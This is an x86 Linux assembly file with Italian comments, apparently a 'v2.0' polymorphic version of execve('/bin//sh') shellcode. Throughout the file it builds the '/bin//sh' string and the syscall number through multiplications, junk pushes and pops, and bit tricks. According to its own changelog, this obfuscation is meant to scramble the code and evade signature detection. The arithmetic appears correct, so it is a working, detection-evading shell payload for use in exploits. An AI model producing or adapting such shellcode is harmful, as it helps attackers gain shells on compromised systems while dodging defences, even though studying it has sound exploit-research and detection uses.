; Changelog
; v2.0
;   * uso un po' di matematica per inizializzare i registri prima della
;     chiamata alla system call
;   * aggiungo un po' di math e operazioni varie per mettere nello stack /bin/sh
;   * aggiungo un po' di operazioni spazzatura tanto per buttarla in caciara

global _start                   

section .text

_start:
; !/bin/sh
; 
; int execve(const char *filename, char *const argv[], char *const envp[]);
; execve() è definita come #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

; v2.0 eax, ecx, edx == 0
mov eax, 0xdeadbeef

xor ecx, ecx
mul ecx
mov edx, eax

push eax        ; Il NULL byte


; v2.0
; sh// -> 0x68732f2f = 0x34399797 * 2 + 1
push 0x1A1CCBCB
push 0xf32a1234
push 0x1298ADBE
inc eax
pop eax
mul eax
pop eax
pop eax

imul eax, 2

; mov eax, 0x34399797 
add eax, eax
add eax, 3
push eax

; v2.0
; bin/ -> 0x6e69622f = 0x24CDCB65 * 3

mov eax, 0x24CDCB65
imul eax, 3
push eax


mov ebx, esp    ; EBX punta a  "/bin//sh"

; execve("/bin/sh", NULL, NULL)

; v2.0  mov al, 0xB 
xor eax, eax
not eax         ; 0xFFFFFFFF
mov ax, 0xf400  ; 0xFFFFF400
sar ax, 8       ; 0xFFFFFFF4
not eax         ; 0x0b

; Abbiamo fatto un po' di moltiplicazioni, EDX ha sporcizia dentro mentre ECX è
; ancora a zero. Mi serve che anche EDX sia 0.
mov edx, ecx
int 0x80
